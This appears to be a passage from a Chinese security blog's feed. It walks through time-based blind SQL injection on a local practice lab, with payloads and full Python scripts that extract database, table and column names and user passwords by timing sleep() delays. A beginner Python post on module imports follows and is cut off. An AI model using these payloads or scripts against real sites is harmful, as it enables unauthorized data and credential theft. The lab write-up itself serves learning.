    <url>/2022/08/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="盲注——时间型"><a href="#盲注——时间型" class="headerlink" title="盲注——时间型"></a>盲注——时间型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;经典查询，看看回显问题</p><p>&emsp;&emsp;正确情况：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/3.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;错误情况：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/2.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="2-尝试or注入"><a href="#2-尝试or注入" class="headerlink" title="2.尝试or注入"></a>2.尝试or注入</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/4.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;明显没反应，说明联合注入失败了</p><p>&emsp;</p><h4 id="3-尝试报错注入"><a href="#3-尝试报错注入" class="headerlink" title="3.尝试报错注入"></a>3.尝试报错注入</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;明显不行，看来只能盲注了</p><p>&emsp;</p><h4 id="4-尝试时间注入"><a href="#4-尝试时间注入" class="headerlink" title="4.尝试时间注入"></a>4.尝试时间注入</h4><p>&emsp;&emsp;通过上面的几次尝试明显没有回显的内容，所以无法考虑联合查询与报错注入，而且可以看见无论是正确的查询还是错误的查询，界面的反馈结果都是不变的，所以也不适合使用布尔注入，那就考虑时间注入。时间注入的主要问题就是等。当语句猜测正确时，会有明显的时间差。</p><p>&emsp;&emsp;正确的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27; and if(length(database())=7,sleep(2),0) #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;可以看见，当我们输入正确的时候，我们的注入时间明显会变长很多，这是由于使用了sleep函数，我这里设置的是多睡眠了2秒，所以明显是在加载中的，而当错误的时候，是很快网页就加载完毕了的。</p><h4 id="5-python脚本"><a href="#5-python脚本" class="headerlink" title="5.python脚本"></a>5.python脚本</h4><p>&emsp;&emsp;主要参考了上一篇写布尔注入写的代码和网络的脚本进行编写，参考链接：（使用的是python3.0版本）</p><ul><li><a href="https://blog.csdn.net/weixin_30265103/article/details/99953534">https://blog.csdn.net/weixin_30265103/article/details/99953534</a></li></ul><h5 id="①先爆数据库："><a href="#①先爆数据库：" class="headerlink" title="①先爆数据库："></a>①先爆数据库：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><br>s = requests.session()<br>url = <span class="hljs-string">&quot;http://127.0.0.1/pika/vul/sqli/sqli_blind_t.php&quot;</span>  <span class="hljs-comment"># 选择攻击的网址</span><br><br><span class="hljs-comment"># headers = &#123;&#x27;cookie&#x27;: &#x27;&#x27;&#125;  # 需要登录的可以添加cookie值</span><br><br><span class="hljs-comment"># 爆破数据库的长度</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-comment"># 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如&#x27;需要变成%27</span><br>    <span class="hljs-comment"># vince&#x27; and if(length(database())=7,sleep(2),0) #</span><br>    databaselen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28database%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url+databaselen_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2-time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        database_len = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database_length:&quot;</span>, <span class="hljs-built_in">str</span>(database_len))<br><br><span class="hljs-comment"># 暴数据库的名</span><br>database_name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr(database(),&quot;+str(l)+&quot;,1))=&quot;+str(i)+&quot;,sleep(2),1)#</span><br>        database_name_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28database%28%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C1%29+%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + database_name_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            database_name = database_name + <span class="hljs-built_in">chr</span>(i)<br>            database_len = l<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;database_name:&#x27;</span>, database_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="②爆表内容："><a href="#②爆表内容：" class="headerlink" title="②爆表内容："></a>②爆表内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆表的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=&quot;+str(l)+&quot;,sleep(1),0)#</span><br>    tablenumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%281%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + tablenumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">1</span>:<br>        tablenumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, tablenumber)<br><br><span class="hljs-comment"># 爆表名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablenumber):<br>    table_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        tablelen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + tablelen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">1</span>:<br>            tablelen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;:&quot;</span>, tablelen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablelen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url 这里需要注意下sleep的时间不能过短，我一开始设置的是1，结果就对了名字的一部分，这说明</span><br>            <span class="hljs-comment"># ?name=vince&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;,sleep(1),0)#</span><br>            tablename_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + tablename_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                table_name = table_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, table_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="③爆列内容："><a href="#③爆列内容：" class="headerlink" title="③爆列内容："></a>③爆列内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆列的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;+str(l)+&quot;,sleep(2),0)#</span><br>    columnnumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + columnnumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        columnnumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;columnnumber:&#x27;</span>, columnnumber)<br><br><span class="hljs-comment"># 爆列名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnnumber):<br>    column_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        columnlen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + columnlen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            columnlen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, columnlen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnlen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;,sleep(2),0)#</span><br>            columnname_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + columnname_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                column_name = column_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, column_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="④爆数据内容："><a href="#④爆数据内容：" class="headerlink" title="④爆数据内容："></a>④爆数据内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆数据的条数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>    <span class="hljs-comment"># 拼接完整的url   从users表中选password列   ?name=vince&#x27; and if((select count(password) from users)=&quot;+str(l)+&quot;,sleep(2),0)#</span><br>    datanumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28password%29+from+users%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + datanumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        datanumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;datenumber:&#x27;</span>, datanumber)<br><br><span class="hljs-comment"># 爆数据内容（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datanumber):<br>    data_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select password from users limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        datalen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + datalen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            datalen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, datalen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datalen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr((select password from users limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot; ,sleep(2),0)#</span><br>            dataname_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;+%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + dataname_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                data_name = data_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dataname&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, data_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h4><p>&emsp;&emsp;时间注入的脚本有布尔注入脚本的基础，实现还是简单的，主要就是两个地方的改动，一个是payload的注入需要在布尔判断的基础上加入if——sleep的判断，第二个就是判断也冲文本内容变为了时间的间隔，当然，在时间的选择上还是有一定讲究的，时间太短会出现错误，时间太长又消耗时间成本，所以要慎重选择。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python日记（二）</title>
    <link href="/2022/08/21/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/08/21/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（二）"><a href="#Python日记（二）" class="headerlink" title="Python日记（二）"></a>Python日记（二）</h1><p>&emsp;&emsp;</p><h4 id="1-模块间的代码元素访问"><a href="#1-模块间的代码元素访问" class="headerlink" title="1.模块间的代码元素访问"></a>1.模块间的代码元素访问</h4><p>&emsp;&emsp;Hello模块代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> World<br><span class="hljs-keyword">from</span> World <span class="hljs-keyword">import</span> z<br><span class="hljs-keyword">from</span> World <span class="hljs-keyword">import</span> x <span class="hljs-keyword">as</span> x2<br><br>x = <span class="hljs-number">100</span><br>y = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">print</span>(y)  <span class="hljs-comment"># 打印当前模块变量y</span><br><span class="hljs-built_in">print</span> (World.y)  <span class="hljs-comment"># 打印World模块变量y</span><br><span class="hljs-built_in">print</span> (z)  <span class="hljs-comment"># 打印world模块变量z</span><br><span class="hljs-built_in">print</span> (x2)  <span class="hljs-comment"># 打印World模块的x</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;World模块代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>x = <span class="hljs-string">&#x27;你好&#x27;</span><br>y = <span class="hljs-literal">True</span><br>z = <span class="hljs-number">20.0</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;运行结果：</p><center><img src="/img/python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/1.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" 